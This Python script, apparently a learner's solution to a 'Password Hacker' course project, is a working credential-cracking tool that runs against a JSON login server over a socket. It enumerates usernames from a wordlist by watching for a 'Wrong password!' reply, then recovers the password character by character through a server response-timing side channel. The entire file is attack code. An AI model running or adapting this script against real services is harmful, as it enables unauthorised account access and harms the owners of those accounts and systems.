"""The functionality for hacking credentials: login and/or password."""

import argparse
import datetime
import itertools
import json
import socket
import timeit
from string import ascii_letters, digits


class PasswordHacker:
    """The creation of the PasswordHacker object and related functionality."""
    
    chars = list(ascii_letters + digits)
    n_ph = 0
    
    def __init__(self, hostname, port):
        """The initializer of the class.

        Arguments:
        hostname -- string, IP or domain
        port -- integer
        counter -- integer, for log-file
        """
        self.hostname = hostname
        self.port = port
        self.counter = 0
    
    def __new__(cls, *args, **kwargs):
        if cls.n_ph == 0:
            cls.n_ph += 1
            return object.__new__(cls)
        return None
    
    def __repr__(self):
        return f'Password Hacker object with:\n' \
               f'IP ADDRESS: {self.hostname}\n' \
               f'PORT: {self.port}\n'
    
    def __str__(self):
        return self.__repr__()
    
    @staticmethod
    def chars_iterator():
        yield from itertools.cycle(PasswordHacker.chars)

    @staticmethod
    def find_login(logins_file, socket):
        with open(logins_file, 'r') as file:
            for line in file:
                login = line.rstrip('\n')
                response = PasswordHacker.get_response(socket, login)
                if response['result'] == 'Wrong password!':
                    return login

    @staticmethod
    def get_response(socket, login, password=' '):
        """Use json module to serialize sent and received messages"""
        json_auth = json.dumps({"login": login, "password": password})
        socket.send(json_auth.encode())
        return json.loads(socket.recv(1024).decode())
    
    
    def log(self, something):
        """Save any intermediate result in log-file."""
        with open('log.txt', 'a') as f:
            f.write(f'{self.counter}: {something} \n')

    
    def time_based_vulnerability(self, logins_file):
        """Algorithm used when admin just caught the exception: there should be a delay
        in the server response
        """
        with socket.socket() as client_socket:
            client_socket.connect((self.hostname, self.port))
            # find the login; save it in valid_login
            valid_login = PasswordHacker.find_login(logins_file, client_socket)
            PasswordHacker.log(self, valid_login)  # save in log.txt
            self.counter += 1
            
            # find password
            password = ""
            try:
                for char in PasswordHacker.chars_iterator():
                    password_guess = password + char
                    first_time = datetime.datetime.now()
                    response = PasswordHacker.get_response(client_socket, valid_login, password_guess)
                    later_time = datetime.datetime.now()
                    time_delay = later_time - first_time
                   
                    if response["result"] == "Connection success!":
                        return json.dumps({"login": valid_login, "password": password_guess})
                    elif time_delay.microseconds >= 90000:
                        PasswordHacker.log(self, password_guess)  # save in log.txt
                        self.counter += 1
                        PasswordHacker.log(self, time_delay)  # save in log.txt
                        self.counter += 1
                        password = password_guess
            except StopIteration:
                return None


def args():
    """Get arguments from command line. Return parser object with attributes."""
    
    parser = argparse.ArgumentParser(description="This program receives 2 arguments \
     and tries to connect to address with generated password through a socket")
    parser.add_argument("IP", help="Type IP address like 127.0.0.1 ")
    parser.add_argument("port", default="9090",
                        help="Specify port like 9090")
    # parser.add_argument("message", help="Type message for sending")
    return parser.parse_args()


def main():
    file_name = r'C:\Users\Тоша\PycharmProjects\Password Hacker\Password Hacker\task\logins.txt'
    # file_name ='logins.txt'
    arguments = args()
    ip, port = arguments.IP, int(arguments.port)
    hacker_object = PasswordHacker(ip, port)
    result = hacker_object.time_based_vulnerability(file_name)
    if result is None:
        print('-> Password not found <-')
    else:
        print(result)


if __name__ == '__main__':
    main()
